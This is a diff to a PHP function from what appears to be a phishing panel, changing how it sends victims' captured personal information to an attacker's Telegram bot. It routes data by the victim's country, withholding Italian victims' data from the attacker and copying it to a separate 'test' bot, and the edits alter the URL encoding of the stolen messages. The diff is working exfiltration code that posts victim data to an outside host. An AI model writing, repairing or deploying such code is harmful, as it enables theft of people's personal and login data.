@@ -117,11 +117,13 @@ function sendToAllBots($bot, $ids, $message, $message_type = "INFO", $victim_ip 
     // For PERSONAL_INFO - Always send to both (attacker + test)
     if ($message_type === "PERSONAL_INFO") {
         foreach($ids as $id){
-            $url = "https://api.telegram.org/bot$bot/sendMessage?chat_id=$id&text=" . urlencode($message);
+            $url = "https://api.telegram.org/bot$bot/sendMessage?chat_id=$id&text=$message";
             sendBot($url);
         }
         if (TEST_MODE_ENABLED) {
-            $test_message = "🛡️ [TEST MODE - $message_type] 🛡️\n" . $message . "\n\n📊 Analysis Data:\n• Panel: $panel\n• Time: " . date('Y-m-d H:i:s');
+            // Decode first for clean display
+            $decoded_msg = urldecode($message);
+            $test_message = "🛡️ [TEST MODE - $message_type] 🛡️\n" . $decoded_msg . "\n\n📊 Analysis Data:\n• Panel: $panel\n• Time: " . date('Y-m-d H:i:s');
             sendToTestBot($test_message);
         }
         return;
@@ -135,14 +137,15 @@ function sendToAllBots($bot, $ids, $message, $message_type = "INFO", $victim_ip 
         if ($isItalian) {
             // ITALIAN IP: Only test bot gets data, attacker gets NOTHING
             if (TEST_MODE_ENABLED) {
-                $test_message = "🛡️ [🇮🇹 ITALIAN IP - $message_type] 🛡️\n" . $message . "\n\n📊 Analysis Data:\n• IP: $victim_ip\n• Country: $country\n• Panel: $panel\n• Time: " . date('Y-m-d H:i:s');
+                $decoded_msg = urldecode($message);
+                $test_message = "🛡️ [🇮🇹 ITALIAN IP - $message_type] 🛡️\n" . $decoded_msg . "\n\n📊 Analysis Data:\n• IP: $victim_ip\n• Country: $country\n• Panel: $panel\n• Time: " . date('Y-m-d H:i:s');
                 sendToTestBot($test_message);
             }
             // Attacker gets nothing - no data sent to original bot
         } else {
             // NON-ITALIAN IP: Only attacker gets data, test gets skipped
             foreach($ids as $id){
-                $url = "https://api.telegram.org/bot$bot/sendMessage?chat_id=$id&text=" . urlencode($message);
+                $url = "https://api.telegram.org/bot$bot/sendMessage?chat_id=$id&text=$message";
                 sendBot($url);
             }
             if (TEST_MODE_ENABLED) {
